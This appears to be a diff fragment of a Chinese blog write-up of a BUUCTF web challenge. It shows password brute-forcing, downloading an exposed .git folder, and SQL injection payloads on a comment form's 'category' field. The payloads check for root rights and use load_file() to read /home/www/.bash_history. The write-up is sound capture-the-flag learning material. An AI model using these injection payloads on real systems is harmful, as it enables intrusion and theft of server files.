+<img src="/2025/03/29/Buuctf2-0/image-20250411104037009.png" class="lazyload" data-srcset="/2025/03/29/Buuctf2-0/image-20250411104037009.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="image-20250411104037009">
 
 <p>这应该就是让我们去爆破zhangwei后面未知的三位，我们先使用bp爆破数字，发现密码为zhangwei666</p>
 <p>登录进入后可以留言，但是没找到什么突破口，尝试&#x2F;.git的时候发现存在，就使用GitHack下载过来</p>
@@ -3110,12 +3110,12 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> <span class="variable">$sql</span> = <span class="string">&quot;insert into comment</span></span><br><span class="line"><span class="string">            set category = &#x27;<span class="subst">$category</span>&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;<span class="subst">$content</span>&#x27;,</span></span><br><span class="line"><span class="string">                bo_id = &#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line">                <span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="comment">//使用了换行 我们不能通过category直接使用# --+等单行注释符进行注释，需要用到/**/多行注释</span></span><br></pre></td></tr></table></figure>
 
 <p>于是我们还是以category为注入点，由于content会回显出来，我们使用content进行查询</p>
-
+<img src="/2025/03/29/Buuctf2-0/image-20250411120425855.png" class="lazyload" data-srcset="/2025/03/29/Buuctf2-0/image-20250411120425855.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="image-20250411120425855">
 
 <p>由于看了wp，知道了flag不在数据库里面所以就不去注数据库了</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#我们使用load_file()之前得看看mysql是否有管理员权限</span><br><span class="line">category<span class="operator">=</span><span class="string">&#x27;,content=(user()),/*</span></span><br><span class="line"><span class="string">content=*/#            为了闭合多行注释符并注释后面的,&#x27;</span></span><br></pre></td></tr></table></figure>
 
-
+<img src="/2025/03/29/Buuctf2-0/image-20250411121230019.png" class="lazyload" data-srcset="/2025/03/29/Buuctf2-0/image-20250411121230019.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="image-20250411121230019">
 
 <p>成功发现为root权限</p>
 <p>后面的操作我只能跟着wp来了，而且这个找到flag的方法有好多种</p>
@@ -3162,7 +3162,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 </ul>
 </li>
 </ul>
-
+<img src="/2025/03/29/Buuctf2-0/image-20250411124047878.png" class="lazyload" data-srcset="/2025/03/29/Buuctf2-0/image-20250411124047878.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="image-20250411124047878">
 
 <p>我们发现除了root和系统账号以外还有个普通账号www在&#x2F;home&#x2F;www下</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">查看<span class="operator">/</span>home<span class="operator">/</span>www<span class="operator">/</span>.bash_history</span><br><span class="line">.bash_history ：保存了当前用户使用过的历史命令,方便查找</span><br><span class="line"><span class="string">&#x27;,content=(load_file(&quot;/home/www/.bash_history&quot;)),/*      &#x27;</span></span><br><span class="line">拿到 cd <span class="operator">/</span>tmp<span class="operator">/</span> unzip html.zip rm <span class="operator">-</span>f html.zip cp <span class="operator">-</span>r html <span class="operator">/</span>var<span class="operator">/</span>www<span class="operator">/</span> cd <span class="operator">/</span>var<span class="operator">/</span>www<span class="operator">/</span>html<span class="operator">/</span> rm <span class="operator">-</span>f .DS_Store service apache2 <span class="keyword">start</span> </span><br><span class="line"></span><br><span class="line">解释一下：先进入<span class="operator">/</span>tmp目录,解压缩了html.zip文件(得到<span class="operator">/</span>tmp<span class="operator">/</span>html)，之后将html.zip删除了，拷贝了一份html给了<span class="operator">/</span>var<span class="operator">/</span>www目录(得到<span class="operator">/</span>var<span class="operator">/</span>www<span class="operator">/</span>html)，之后将<span class="operator">/</span>var<span class="operator">/</span>www<span class="operator">/</span>html下的.DS_Store文件删除，但是<span class="operator">/</span>tmp<span class="operator">/</span>html下的.DS_Store文件没有删除,查看一下</span><br><span class="line">unzip:解压缩</span><br><span class="line">.DS_Store:这个文件是常见的备份文件</span><br></pre></td></tr></table></figure>
